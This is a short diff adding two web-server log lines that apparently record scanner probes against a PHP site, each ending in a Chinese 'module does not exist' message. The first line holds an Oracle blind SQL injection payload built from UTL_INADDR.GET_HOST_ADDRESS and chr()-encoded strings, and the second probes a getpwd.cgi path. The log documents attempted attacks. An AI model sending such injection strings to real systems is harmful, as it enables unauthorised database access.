@@ -1,0 +1,2 @@
+2014-05-17 17:31:12 | 220.181.158.109 | /index.php/article/index/article/list/cid/1'||(SELECT 'ijx' FROM DUAL WHERE 1122=1122 AND 4557=UTL_INADDR.GET_HOST_ADDRESS((SELECT chr(99)||chr(102)||chr(114)||chr(101)||chr(101)||chr(114)  FROM dual)))||' |article模块不存在
+2014-05-17 17:31:12 | 220.181.158.109 | /index.php/jdwm/cgi/getpwd.cgi |jdwm模块不存在
